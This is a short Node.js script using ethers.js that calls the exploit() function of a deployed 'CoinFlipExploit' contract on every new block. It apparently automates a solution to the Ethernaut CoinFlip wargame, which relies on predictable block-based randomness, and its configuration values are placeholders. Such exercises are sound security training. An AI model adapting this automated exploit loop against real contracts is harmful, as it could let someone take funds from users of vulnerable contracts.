const { ethers } = require("ethers");

// Configuration
const providerURL = 'PROVIDER_URL';
const privateKey = 'PRIV_KEY';
const coinFlipExploitContractAddress = 'EXPLOIT_ADDRESS';
const coinFlipExploitABI = [
    // ABI of your CoinFlipExploit contract
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "_coinFlipAddress",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "_factor",
                    "type": "uint256"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "inputs": [],
            "name": "FACTOR",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "exploit",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    
];

async function main() {
    // Setup provider and wallet
    const provider = new ethers.providers.JsonRpcProvider(providerURL);
    const wallet = new ethers.Wallet(privateKey, provider);
    
    // Setup contract instance
    const coinFlipExploitContract = new ethers.Contract(coinFlipExploitContractAddress, coinFlipExploitABI, wallet);

    provider.on("block", async (blockNumber) => {
        console.log(`New block: ${blockNumber}`);
        try {
            // Call the exploit function
            const tx = await coinFlipExploitContract.exploit();
            await tx.wait();
            console.log(`Exploit called in block ${blockNumber}`);
        } catch (error) {
            console.error("Error calling exploit:", error);
        }
    });
}

main().catch(console.error);
